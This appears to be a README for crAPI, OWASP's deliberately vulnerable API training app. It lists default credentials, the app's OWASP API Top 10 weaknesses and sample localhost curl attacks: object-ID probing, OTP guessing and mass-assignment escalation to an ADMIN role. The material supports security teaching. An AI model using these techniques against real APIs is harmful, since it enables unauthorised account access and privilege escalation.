# crAPI - Completely Ridiculous API

## Description
crAPI (Completely Ridiculous API) is a deliberately vulnerable modern API application built by OWASP. It's designed to demonstrate the OWASP API Security Top 10 vulnerabilities in a microservices architecture.

## Access URLs
- **Main Application**: http://localhost:8888
- **MailHog (Email Interface)**: http://localhost:8025

## Architecture
crAPI consists of multiple microservices:
- **Web Frontend**: React-based UI
- **Identity Service**: User authentication and management
- **Community Service**: Forum and social features
- **Workshop Service**: Vehicle workshop management
- **Database**: PostgreSQL and MongoDB

## Default Users
1. **Regular User**:
   - Email: user@example.com
   - Password: password
   
2. **Mechanic**:
   - Email: mechanic@example.com
   - Password: password

3. **Admin** (if available):
   - Email: admin@example.com
   - Password: password

## Key Vulnerabilities

### API1:2019 - Broken Object Level Authorization (BOLA)
- Access other users' vehicle details
- View other users' mechanic reports
- Location: Vehicle and Mechanic endpoints

### API2:2019 - Broken User Authentication
- Weak password reset mechanism
- JWT implementation flaws
- Location: Login and password reset endpoints

### API3:2019 - Excessive Data Exposure
- User profile endpoint returns sensitive data
- Vehicle reports contain unnecessary information
- Location: /identity/api/v2/user endpoint

### API4:2019 - Lack of Resources & Rate Limiting
- No rate limiting on OTP requests
- Unlimited login attempts
- Location: Authentication endpoints

### API5:2019 - Broken Function Level Authorization
- Access admin functions as regular user
- Delete other users' posts
- Location: Admin panel endpoints

### API6:2019 - Mass Assignment
- Modify user role during registration
- Update vehicle properties not intended for users
- Location: Registration and vehicle endpoints

### API7:2019 - Security Misconfiguration
- Debug mode enabled
- Verbose error messages
- CORS misconfiguration

### API8:2019 - Injection
- SQL Injection in search functionality
- NoSQL injection in community posts
- Location: Search and filter endpoints

### API9:2019 - Improper Assets Management
- Old API versions still accessible
- Undocumented endpoints
- Location: /api/v1/* endpoints

### API10:2019 - Insufficient Logging & Monitoring
- Sensitive actions not logged
- No alerting on suspicious activities

## Exploitation Examples

### 1. BOLA - Access Other Users' Vehicles
```bash
# Get your auth token first
curl -X POST http://localhost:8888/identity/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@example.com","password":"password"}'

# Try accessing other vehicle IDs
curl http://localhost:8888/workshop/api/vehicles/1 \
  -H "Authorization: Bearer YOUR_TOKEN"
```

### 2. Broken Authentication - Weak OTP
```bash
# Request password reset
curl -X POST http://localhost:8888/identity/api/auth/forget-password \
  -H "Content-Type: application/json" \
  -d '{"email":"user@example.com"}'

# Try common OTPs: 0000, 1234, etc.
```

### 3. Mass Assignment - Privilege Escalation
```bash
# During registration, try adding role field
curl -X POST http://localhost:8888/identity/api/auth/signup \
  -H "Content-Type: application/json" \
  -d '{
    "name":"Test User",
    "email":"test@example.com",
    "password":"password",
    "role":"ADMIN"
  }'
```

### 4. Excessive Data Exposure
```bash
# Check user profile endpoint
curl http://localhost:8888/identity/api/v2/user \
  -H "Authorization: Bearer YOUR_TOKEN"
# Look for sensitive fields that shouldn't be exposed
```

## Tools for Testing
- **Burp Suite**: Intercept and modify API requests
- **Postman**: API testing with collections
- **OWASP ZAP**: Automated API scanning
- **curl**: Command-line API testing

## Learning Resources
- Review the API documentation (if available)
- Use browser DevTools to inspect API calls
- Check MailHog for password reset tokens
- Look for hidden endpoints in JavaScript source

## Security Best Practices (What This App Lacks)
1. Proper authorization checks on all endpoints
2. Strong authentication mechanisms
3. Rate limiting and throttling
4. Input validation and sanitization
5. Minimal data exposure
6. Proper error handling
7. Comprehensive logging and monitoring

## Tips
- Start by creating a regular user account
- Use browser DevTools Network tab to see API calls
- Check MailHog for all emails sent by the system
- Look for API versioning (v1, v2) in endpoints
- Test both authenticated and unauthenticated access 